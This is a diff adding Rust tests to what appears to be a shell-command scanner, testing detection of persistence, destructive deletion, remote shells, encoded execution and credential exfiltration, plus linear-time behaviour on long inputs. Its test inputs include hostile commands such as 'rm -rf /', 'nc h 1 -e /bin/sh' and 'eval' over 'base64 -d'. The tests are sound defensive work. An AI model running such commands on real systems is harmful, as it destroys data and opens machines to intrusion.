@@ -897,6 +897,159 @@ fn a_long_line_costs_each_reader_one_pass() {
 }
 
 #[test]
+fn a_long_word_of_startup_files_is_read_once() {
+    use super::is_persistence;
+    // One word holding a startup file's name many times over: packaged,
+    // climbing out of the package, and not packaged at all.
+    let names = ".bashrc".repeat(30_000);
+    assert!(!is_persistence(&format!("install x $pkgdir/{names}")));
+    assert!(!is_persistence(&format!(
+        "install x \"${{pkgdir}}\"/{names}"
+    )));
+    assert!(is_persistence(&format!("install x $pkgdir/{names}/../y")));
+    assert!(is_persistence(&format!("install x $pkgdir/.\\./{names}")));
+    assert!(is_persistence(&format!("install x $pkgdirs/{names}")));
+    assert!(is_persistence(&names));
+    // Only what stands in the same word counts.
+    assert!(!is_persistence("cp .. $pkgdir/etc/profile.d/x.sh"));
+    assert!(is_persistence("cp x $pkgdir/etc/profile.d/x.sh/.."));
+    assert!(is_persistence("cp $pkgdir/a/../etc/profile.d/x.sh"));
+    assert!(is_persistence("echo x >>\"$pkgdir/..\"/.bashrc"));
+    assert!(!is_persistence("echo x >>\"$pkgdir/.bashrc.zshrc\" .."));
+}
+
+#[test]
+fn commands_that_share_their_arguments_cost_one_pass() {
+    use super::destructive::removes_root_or_home;
+    use super::matchers::is_remote_shell;
+    let removals = "rm -rf ".repeat(30_000);
+    assert!(!removes_root_or_home(&removals));
+    assert!(removes_root_or_home(&format!("{removals}/")));
+    assert!(!removes_root_or_home(&format!("{removals}; /")));
+    assert!(removes_root_or_home(&format!(
+        "{}-rf /",
+        "rm ".repeat(50_000)
+    )));
+    for (line, removes) in [
+        ("rm / -rf", true),
+        ("rm -rf a ~/;", true),
+        ("rm -r a; rm /", false),
+        ("rm -r a | rm /", false),
+        ("rm a; -r /", false),
+        ("rm -rf a& /", false),
+        ("x rm -r $home", true),
+    ] {
+        assert_eq!(removes_root_or_home(line), removes, "{line}");
+    }
+    let listeners = "nc ".repeat(50_000);
+    assert!(!is_remote_shell(&listeners));
+    assert!(is_remote_shell(&format!("{listeners}-e sh")));
+    assert!(!is_remote_shell(&format!("{listeners}; echo -e sh")));
+    assert!(!is_remote_shell("nc -l 1 | sh -e"));
+    assert!(is_remote_shell("x; nc h 1 -e /bin/sh; y"));
+}
+
+#[test]
+fn only_a_variable_that_is_named_is_written_out() {
+    use super::with_variables;
+    let variables = [
+        ("f".to_string(), "curl".to_string()),
+        ("fx".to_string(), "wget".to_string()),
+    ];
+    for (code, written) in [
+        (
+            "$f ${f} $fx ${fx} $fy ${fy} $ f {f}",
+            "curl curl wget wget $fy ${fy} $ f {f}",
+        ),
+        ("$(f) $$f ${f", "$(f) $curl ${f"),
+    ] {
+        assert_eq!(with_variables(code, &variables), written, "{code}");
+    }
+    let long = "$( ".repeat(100_000);
+    assert_eq!(with_variables(&long, &variables), long);
+    // What is written out is read again for the variables after it, and a
+    // name no shell would take is still matched as given.
+    let chained = [
+        ("a".to_string(), "$b".to_string()),
+        ("b".to_string(), "sh".to_string()),
+        ("curlx".to_string(), "wget".to_string()),
+    ];
+    assert_eq!(with_variables("$a $${f}x", &chained), "sh $${f}x");
+    assert_eq!(
+        with_variables("$a $${f}x", &[&variables[..1], &chained[..]].concat()),
+        "sh wget"
+    );
+    let odd = [("a-b".to_string(), "sh".to_string())];
+    assert_eq!(with_variables("$a-b ${a-b} $a", &odd), "sh sh $a");
+}
+
+#[test]
+fn files_opened_by_run_calls_are_named_on_a_line_of_any_length() {
+    use super::run_targets;
+    // What each call is given is read: the first of each kind in it.
+    assert_eq!(
+        run_targets("exec(open('a.py').read() + open('b.py').read()); open('c.py')"),
+        ["a.py"]
+    );
+    // Calls beyond what is read call by call: every file opened on the
+    // line is named.
+    let many = "exec(".repeat(256) + &"x".repeat(4096) + &")".repeat(256);
+    let named = |line: &str, file: &str| run_targets(line).iter().any(|name| name == file);
+    assert!(named(
+        &format!("{many}; exec(open('./evil.bin').read())"),
+        "evil.bin"
+    ));
+    let line =
+        format!("{many}; exec(open('a.py').read() + open(\"b.py\").read()); read_text('c.py')");
+    for file in ["a.py", "b.py", "c.py"] {
+        assert!(named(&line, file), "{file}");
+    }
+    // Under that, only what a call is given names a file.
+    let few = "exec(".repeat(8) + &")".repeat(8);
+    assert!(named(&format!("{few}; exec(open('a.py'))"), "a.py"));
+    assert!(!named(&format!("{few}; exec(x); open('a.py')"), "a.py"));
+    // Many calls, and many files, cost one pass.
+    assert!(run_targets(&"exec(".repeat(200_000)).is_empty());
+    let opens: Vec<String> = (0..40_000)
+        .map(|at| format!("exec(open('f{at}'))"))
+        .collect();
+    assert_eq!(run_targets(&opens.concat()).len(), 40_000);
+}
+
+#[test]
+fn substitutions_inside_one_another_cost_each_rule_little() {
+    // Each of these is sixty-four substitutions that reach the end of the
+    // line: none is run, so no rule reads them. At this length these check
+    // what is found; the nested line that names the clipboard, below, is
+    // the one that would not come back in a test's time were each body
+    // read.
+    for token in ["$(", "<(", "$(curl ", "x=$(", "\"$( "] {
+        let line = token.repeat(60_000 / token.len());
+        let found = rules_for(&line);
+        assert!(found.is_empty(), "{token}: {found:?}");
+    }
+    // Run, they are more than is read, and the line is reported.
+    let nested = "$(tr a b ".repeat(8_000);
+    assert_eq!(
+        rules_for(&format!("eval {nested}")),
+        [RuleId::EncodedCommandExecution]
+    );
+    // The clipboard is named, but by none of the commands that are read.
+    let nested = "$(echo ".repeat(8_000);
+    assert_eq!(
+        rules_for(&format!("curl a {nested}xclip")),
+        [RuleId::CredentialExfiltration]
+    );
+    assert!(rules_for("curl a $(echo $(echo $(echo xclip)))").is_empty());
+    // A few are read as before.
+    assert!(rules_for("eval \"$(echo \"$(tr a b <<< \"$(cat x)\")\")\"").is_empty());
+    assert_eq!(
+        rules_for("eval \"$(echo \"$(echo \"$(base64 -d x)\")\")\""),
+        [RuleId::EncodedCommandExecution]
+    );
+}
+
+#[test]
 fn remote_shells_are_caught_without_firing_on_imports() {
     for shell in [
         "nc -e /bin/sh 10.0.0.1 4444",
